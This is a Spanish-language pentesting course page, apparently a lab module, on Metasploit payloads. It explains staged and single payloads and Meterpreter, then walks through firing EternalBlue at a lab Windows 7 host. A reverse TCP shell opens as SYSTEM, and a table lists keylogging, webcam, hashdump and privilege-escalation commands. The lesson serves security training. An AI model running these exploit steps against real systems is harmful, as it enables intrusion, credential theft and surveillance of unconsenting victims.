# Payloads

En Metasploit, una **Payload** (carga útil) se refiere a un módulo que ayuda al módulo de exploit, generalmente devolviendo un shell al atacante. Las cargas útiles se envían junto con el exploit para eludir los procedimientos de funcionamiento estándar del servicio vulnerable (función del exploit) y luego se ejecutan en el sistema operativo objetivo para, normalmente, devolver una conexión inversa al atacante y establecer un punto de apoyo (función de la carga útil).

Existen tres tipos diferentes de módulos de carga útil en el marco de Metasploit: **Singles**, **Stagers** y **Stages**. Usar estas tres tipologías de interacción de cargas útiles puede ser beneficioso para el pentester, ya que ofrece la flexibilidad necesaria para realizar ciertas tareas. Si una carga útil está o no en etapas (staged) se representa con una barra (/) en el nombre de la carga útil.

Por ejemplo:

* `windows/shell_bind_tcp` es una carga útil simple (Single) sin etapas.
* `windows/shell/bind_tcp` consiste en un stager (`bind_tcp`) y una etapa (`shell`).

## **Singles** (Cargas Útiles Simples)

Una carga útil **Single** contiene el exploit y el shellcode completo para la tarea seleccionada. Estas cargas útiles son más estables por diseño ya que contienen todo en uno. Sin embargo, algunos exploits no soportan el tamaño resultante de estas cargas útiles, ya que pueden volverse bastante grandes. Las cargas útiles simples son autónomas, se envían y ejecutan en el sistema objetivo, brindando un resultado inmediatamente después de su ejecución. Un ejemplo podría ser añadir un usuario al sistema objetivo o iniciar un proceso.

### **Stagers** (Gestores)

Las cargas útiles **Stager** trabajan con las cargas útiles **Stage** para realizar una tarea específica. Un **Stager** espera en la máquina del atacante, listo para establecer una conexión con el host víctima una vez que la etapa (Stage) completa su ejecución. Los stagers se utilizan para configurar una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y confiables. Metasploit selecciona el más adecuado y, si es necesario, utiliza uno menos preferido.

**Stagers en Windows: NX vs NO-NX**

* **NX** (No-eXecute) aborda problemas de compatibilidad con **DEP** (Data Execution Prevention).
* Los stagers **NX** son más grandes debido a la asignación de memoria con `VirtualAlloc`.
* La opción predeterminada es ahora compatible con **NX** y **Windows 7**.

## **Stages** (Etapas)

Las **Stages** son componentes de carga útil que se descargan a través de los módulos **Stager**. Estas etapas proporcionan funciones avanzadas sin límites de tamaño, como **Meterpreter**, **inyección VNC**, entre otras. Las stages automáticamente usan **middle stagers** para realizar una descarga completa:

* Un solo `recv()` fallará con cargas útiles grandes.
* El **stager** recibe el **middle stager**.
* El **middle stager** realiza la descarga completa.

## **Cargas Útiles con Etapas (Staged Payloads)**

Una **carga útil en etapas** es un proceso de explotación modularizado y funcionalmente separado. Cada parte completa su objetivo individual, pero todas funcionan juntas para encadenar el ataque. Esto finalmente concede acceso remoto a la máquina objetivo si todas las etapas funcionan correctamente.

El objetivo de estas cargas útiles es, además de conceder acceso shell, ser lo más compactas e inconspicuas posible para evadir antivirus (AV) o sistemas de prevención de intrusiones (IPS). La **Stage0** es la primera parte de la carga útil que se envía, cuyo único propósito es iniciar una conexión inversa al atacante. Los nombres comunes para estas conexiones incluyen `reverse_tcp`, `reverse_https` y `bind_tcp`.

### **Ejemplo de Comando `show payloads`**

```scss
scssCopiar códigomsf6 > show payloads

<SNIP>

544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support

<SNIP>
```

### **Cargas Útiles Meterpreter**

La carga útil **Meterpreter** es un tipo específico de carga útil multifacética que utiliza inyección DLL para asegurar una conexión estable y persistente en el host víctima. **Meterpreter** reside completamente en la memoria del host remoto, lo que lo hace difícil de detectar con técnicas forenses convencionales. Una vez ejecutada, se crea una nueva sesión que genera una interfaz de Meterpreter. Esta interfaz es similar a `msfconsole`, pero todos los comandos están dirigidos al sistema objetivo.

Meterpreter ofrece una variedad de comandos útiles, como captura de pulsaciones de teclas, recolección de hashes de contraseñas, acceso al micrófono, captura de pantalla, entre otros. Además, se pueden cargar y descargar dinámicamente **plugins** para asistir en la evaluación.

En secciones posteriores se explorarán más detalles sobre Meterpreter y los diferentes plugins disponibles.

## Búsqueda de Cargas Útiles (Payloads)

Para seleccionar nuestra primera carga útil (payload), es importante saber qué queremos hacer en la máquina objetivo. Por ejemplo, si buscamos persistencia de acceso, probablemente querremos seleccionar una carga útil de **Meterpreter**.

Como se mencionó antes, las cargas útiles de **Meterpreter** nos ofrecen una gran flexibilidad. Su funcionalidad base ya es vasta y poderosa. Al combinarse con complementos como **Mimikatz** de **GentilKiwi**, podemos automatizar y entregar partes de la prueba de penetración mientras mantenemos una evaluación organizada y eficiente en cuanto al tiempo. Para ver todas las cargas útiles disponibles, podemos usar el comando `show payloads` en **msfconsole**.

### **Lista de Payloads en Metasploit**

```bash
msf6 > show payloads

Payloads
========

   #    Nombre                                                Fecha de Divulgación  Rango    Revisión  Descripción
   ---- ----------------------------------------------------  -------------------  -------  --------  ------------
   0    aix/ppc/shell_bind_tcp                                manual  No    AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                               manual  No    AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                manual  No    AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                             manual  No    AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                      manual  No    Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                     manual  No    Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                       manual  No    Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                      manual  No    Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                     manual  No    Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                       manual  No    Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                            manual  No    Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                           manual  No    Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                             manual  No    Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http            manual  No    Apple_iOS Meterpreter, Reverse HTTP Inline
```

#### Selección de Payload para Windows 7 (x64)

En lugar de usar el payload predeterminado, que es un simple `reverse_tcp_shell`, utilizaremos un payload de **Meterpreter** para **Windows 7 (x64)**. Navegamos en la lista de **payloads** y encontramos la sección que contiene payloads para **Windows (x64)**.

```bash
   515  windows/x64/meterpreter/bind_ipv6_tcp                             manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                        manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                           manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                  manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                              manual  No    Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                             manual  No    Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                              manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                             manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                        manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                               manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                           manual  No    Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                          manual  No    Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                           manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                          manual  No    Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
```

### Filtrando Cargas Útiles con grep

Puede ser un proceso largo buscar el payload adecuado entre una lista tan extensa. Para acelerar la búsqueda, podemos utilizar el comando `grep` en **msfconsole** y filtrar términos específicos.

Por ejemplo, si queremos una **reverse shell** basada en **TCP** manejada por **Meterpreter**, podemos buscar todos los resultados que contengan la palabra **Meterpreter**.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```

Esto nos devuelve 14 resultados. Ahora podemos añadir otro comando `grep` para buscar solo aquellos que contengan `reverse_tcp`.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

## Selección del Payload

Para seleccionar el **payload** deseado, utilizamos el comando `set payload <número>`.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

Después de seleccionar el **payload**, aparecerán más opciones disponibles para configurar, como `LHOST` y `LPORT`, que son la dirección y puerto de escucha para inicializar la conexión reversa.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------  
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------  
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

## Uso de Payloads (Cargas Útiles)

Es momento de configurar los parámetros tanto del módulo de explotación como del módulo de payload. Para la parte de explotación, debemos configurar los siguientes parámetros:

**Parámetros del Exploit:**

| **Parámetro** | **Descripción**                                                                   |
| ------------- | --------------------------------------------------------------------------------- |
| **RHOSTS**    | La dirección IP del host remoto, es decir, la máquina objetivo.                   |
| **RPORT**     | No requiere cambio, solo confirmar que estamos en el puerto 445, donde corre SMB. |

**Parámetros del Payload:**

| **Parámetro** | **Descripción**                                                  |
| ------------- | ---------------------------------------------------------------- |
| **LHOST**     | La dirección IP del host, es decir, la máquina atacante.         |
| **LPORT**     | No requiere cambio, solo confirmar que el puerto no esté en uso. |

Si queremos verificar rápidamente nuestra dirección IP (LHOST), siempre podemos usar el comando `ifconfig` directamente desde el menú de **msfconsole**.

```bash
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig
```

```bash
[*] exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>
```

Ahora establecemos el LHOST y RHOSTS:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
LHOST => 10.10.14.15
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```

Luego, podemos ejecutar el exploit y revisar los resultados:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

```bash
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Después de abrir la sesión de Meterpreter:

```bash
meterpreter > whoami
[-] Unknown command: whoami.
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

El comando `whoami`, común en Windows, no funciona aquí, ya que el prompt es de Meterpreter. Podemos usar el comando equivalente en Linux: `getuid`.

### Comandos de Meterpreter

Explorar el menú de ayuda nos permite ver todas las capacidades del payload de Meterpreter.

```bash
meterpreter > help
```

**Comandos Básicos:**

| **Comando**  | **Descripción**                                   |
| ------------ | ------------------------------------------------- |
| `?`          | Menú de ayuda                                     |
| `background` | Envía la sesión actual al fondo                   |
| `exit`       | Termina la sesión de Meterpreter                  |
| `run`        | Ejecuta un script de Meterpreter o un módulo Post |
| `sessions`   | Cambia rápidamente a otra sesión                  |

**Comandos del Sistema de Archivos:**

| **Comando** | **Descripción**                  |
| ----------- | -------------------------------- |
| `cd`        | Cambia de directorio             |
| `ls`        | Lista archivos                   |
| `download`  | Descarga un archivo o directorio |
| `upload`    | Sube un archivo o directorio     |
| `rm`        | Elimina el archivo especificado  |

**Comandos de Redes:**

| **Comando** | **Descripción**                               |
| ----------- | --------------------------------------------- |
| `arp`       | Muestra la caché ARP del host                 |
| `ifconfig`  | Muestra las interfaces                        |
| `netstat`   | Muestra las conexiones de red                 |
| `portfwd`   | Redirige un puerto local a un servicio remoto |

**Comandos del Sistema:**

| **Comando** | **Descripción**                        |
| ----------- | -------------------------------------- |
| `getuid`    | Muestra el usuario actual              |
| `ps`        | Lista los procesos en ejecución        |
| `shutdown`  | Apaga el sistema remoto                |
| `reboot`    | Reinicia el sistema remoto             |
| `sysinfo`   | Obtiene información del sistema remoto |

**Comandos de Interfaz de Usuario:**

| **Comando**     | **Descripción**                             |
| --------------- | ------------------------------------------- |
| `screenshot`    | Toma una captura de pantalla del escritorio |
| `keyscan_start` | Inicia la captura de teclas                 |
| `keyscan_dump`  | Muestra el buffer de teclas capturadas      |

**Comandos de Cámara Web:**

| **Comando**     | **Descripción**                        |
| --------------- | -------------------------------------- |
| `webcam_snap`   | Toma una captura desde la cámara web   |
| `webcam_stream` | Transmite un video desde la cámara web |

**Comandos de Elevación de Privilegios:**

| **Comando** | **Descripción**                         |
| ----------- | --------------------------------------- |
| `getsystem` | Intenta elevar los privilegios a SYSTEM |
| `hashdump`  | Extrae los hashes del SAM               |

### Navegación en Meterpreter:

```bash
meterpreter > cd Users
meterpreter > ls
```

```bash
meterpreter > shell
```

```bash
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users> whoami
nt authority\system
```

Al usar `shell`, podemos acceder a la CLI de Windows en la máquina objetivo.

## Tipos de Payload (Cargas Útiles)

La siguiente tabla contiene los payloads más comunes usados en máquinas Windows y sus respectivas descripciones.

| **Payload**                       | **Descripción**                                                          |
| --------------------------------- | ------------------------------------------------------------------------ |
| `generic/custom`                  | Listener genérico, de uso múltiple                                       |
| `generic/shell_bind_tcp`          | Listener genérico, de uso múltiple, shell normal, conexión TCP vinculada |
| `generic/shell_reverse_tcp`       | Listener genérico, de uso múltiple, shell normal, conexión TCP inversa   |
| `windows/x64/exec`                | Ejecuta un comando arbitrario (Windows x64)                              |
| `windows/x64/loadlibrary`         | Carga una biblioteca arbitraria x64                                      |
| `windows/x64/messagebox`          | Genera un cuadro de diálogo con un título, texto e ícono personalizables |
| `windows/x64/shell_reverse_tcp`   | Shell normal, payload único, conexión TCP inversa                        |
| `windows/x64/shell/reverse_tcp`   | Shell normal, stager + stage, conexión TCP inversa                       |
| `windows/x64/shell/bind_ipv6_tcp` | Shell normal, stager + stage, stager TCP vinculado a IPv6                |
| `windows/x64/meterpreter/$`       | Payload de Meterpreter + variedades anteriores                           |
| `windows/x64/powershell/$`        | Sesiones interactivas de PowerShell + variedades anteriores              |
| `windows/x64/vncinject/$`         | Servidor VNC (inyección reflexiva) + variedades anteriores               |

Otros payloads críticos que son ampliamente utilizados por los evaluadores de seguridad durante las pruebas de penetración incluyen los payloads de **Empire** y **Cobalt Strike**. Aunque no están dentro del alcance de este curso, te sugerimos investigarlos en tu tiempo libre, ya que pueden proporcionar una gran cantidad de información sobre cómo los profesionales realizan evaluaciones en objetivos de alto valor.

Además de estos, por supuesto, hay una gran variedad de otros payloads. Algunos están destinados a dispositivos específicos, como **Cisco**, **Apple** o **PLC**. Algunos podemos generarlos nosotros mismos utilizando **msfvenom**. Sin embargo, a continuación, veremos **encoders** y cómo pueden influir en el resultado de un ataque.
